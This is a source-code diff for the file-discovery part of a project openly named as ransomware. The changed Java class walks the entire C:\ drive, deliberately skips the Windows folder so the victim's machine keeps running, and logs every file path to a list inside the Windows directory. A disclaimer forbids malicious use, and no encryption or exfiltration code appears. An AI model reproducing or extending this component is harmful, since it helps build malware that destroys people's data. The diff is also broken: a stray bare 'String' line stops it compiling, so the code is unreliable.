@@ -1,10 +1,11 @@
 /********************************************************************
-    _____                        __        __
-   |_   _|                      |  |      | |
-     | |   ___ _ __   __ ____ _ |  |  __  | | ____ _ _ __  ___
-     | | /  _ ' |\ \ / //  _ ' ||  | /  \ | |/  _ ' | '__/  _  \
-   __/ / | (_)  | \ V / | (_)  |\  V  /\ V  /| (_)  | |  |  ___/
-  \__ /  \____,_|  \_/  \____,_| \__/   \__/ \____,_|_|   \____|
+    _____                        _        _
+   |_   _|                      | |      | |
+     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
+     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
+   __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
+  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|
+
 
 Copyright (c) 2019 Kyra Mozley
 Created on 18/07/19
@@ -18,36 +19,53 @@ DO NOT USE FOR MALICIOUS ACTIVITY
  *********************************************************************/
 package RansomeWare;
 
-import java.io.File;
+import java.io.*;
 import java.text.SimpleDateFormat;
+
 
 public class FindFiles {
     static int count = 0;
+    BufferedWriter fileWriter;
 
-    public void traverse(String path) {
+
+    public void FindFiles() throws Exception {
+        //creating a file to write flies found to
+        Writer writer = new FileWriter("c:\\Windows\\output.txt", false);
+        fileWriter = new BufferedWriter(writer);
+        traverse("c:\\");
+        fileWriter.close();
+    }
+    public void traverse(String path) throws Exception {
         File root = new File(path);
         File[] list = root.listFiles();
 
         if(list == null) return;
-
         for(File f: list) {
             if (f.isDirectory()) {
+                String
                 if (f.getName().equals("Windows")) return; //want system to still work
-
                 traverse(f.getAbsolutePath());
                 System.out.println("Dir:" + f.getAbsoluteFile());
             } else {
                 SimpleDateFormat lastModified = new SimpleDateFormat("dd/MM/yyyy");
                 System.out.println("File:" + f.getAbsoluteFile() + " Last Modified:" + f.lastModified());
                 count++;
+                fileWriter.write(f.getAbsolutePath());
+                fileWriter.newLine();
             }
         }
-
     }
 
-    public static void main(String[] args) {
+    /**
+     *
+     * @param args
+     */
+    public static void main(String[] args) throws Exception {
         FindFiles ff = new FindFiles();
-        ff.traverse("c:\\");
+        long startTime = System.nanoTime();
+        ff.FindFiles();
+        long endTime = System.nanoTime();
+        System.out.println("Time: " + (endTime - startTime));
         System.out.println(count);
     }
 }
